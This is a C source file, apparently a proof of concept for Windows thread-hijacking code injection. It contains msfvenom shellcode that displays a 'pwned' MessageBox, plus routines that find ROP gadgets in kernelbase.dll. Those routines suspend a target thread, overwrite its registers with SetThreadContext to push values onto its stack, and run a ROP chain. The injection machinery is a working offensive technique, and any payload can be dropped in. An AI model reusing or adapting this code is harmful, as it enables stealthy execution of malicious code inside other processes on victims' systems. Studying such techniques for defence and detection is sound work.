#include <windows.h>
#include <stdio.h>
#define push(x) pushm(x, thd)

//shellcode spawns a MessageBox, then exits process. made with msf
unsigned char buf[] = 
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
"\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
"\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
"\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
"\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
"\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
"\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89"
"\xe3\x68\x64\x21\x58\x20\x68\x70\x77\x6e\x65\x31\xc9\x88"
"\x4c\x24\x06\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31"
"\xc0\x50\xff\x55\x08";

unsigned int pshc; //push eax; call esi
unsigned int jmps; //jmp $
unsigned int ret; //ret

//gadget finder
unsigned int findr(const unsigned char* pattern, int sz){
    unsigned char* ptr = (unsigned char*)GetModuleHandleA("kernelbase.dll");
    ptr+=0x1000;
    while(memcmp(pattern, ptr, sz)!=0)
        ptr++;
    return (unsigned int)ptr;
}

//wait for user time to increase, signify kernel exit, thread can be manipulated
void waitunblock(HANDLE thd){
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;
    while(1){
        Sleep(1);
        GetThreadTimes(thd, &a, &b, &c, &d);
        if(d.dwLowDateTime - pt > 8) break;
        pt = d.dwLowDateTime;
    }
    return;
}

//push val to stack, returns address of pushed data
unsigned int pushm(unsigned int data, HANDLE thd){
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Esp += 4;
    ctx.Eip = pshc;
    ctx.Eax = data;
    ctx.Esi = jmps;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
    return ctx.Esp-4;
}

//push val to stack, but returns return val of previous fn called (in eax)
unsigned int getretpush(unsigned int data, HANDLE thd){
    CONTEXT ctx2;
    SuspendThread(thd);
    ctx2.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx2);
    ctx2.Eip = pshc;
    unsigned int addr = ctx2.Eax;
    ctx2.Eax = 0;
    ctx2.Esi = jmps;
    SetThreadContext(thd, &ctx2);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
    return addr;
}

//push junk to stack
void opening(HANDLE thd){
    CONTEXT ctx;
    SuspendThread(thd);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Eax = 0;
    ctx.Eip = pshc;
    ctx.Esi = jmps;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
}

//execute the prepared rop sled
void slay(HANDLE thd){
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Esp += 4;
    ctx.Eip = ret;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
}